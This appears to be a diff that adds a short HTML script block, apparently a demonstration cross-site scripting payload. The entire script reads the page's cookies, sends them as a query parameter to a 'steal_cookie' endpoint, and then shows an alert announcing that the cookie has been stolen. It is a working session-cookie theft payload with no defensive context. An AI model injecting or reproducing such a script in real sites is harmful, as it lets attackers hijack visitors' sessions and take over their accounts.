@@ -1,0 +1,12 @@
+<script>
+    let cookies = document.cookie;
+
+    let xhr = new XMLHttpRequest();
+    xhr.open("GET", `steal_cookie?cookie=${cookies}`);
+
+    xhr.onload = () => {
+        alert("Cookie has been stolen!");
+    };
+    xhr.send();
+
+</script>
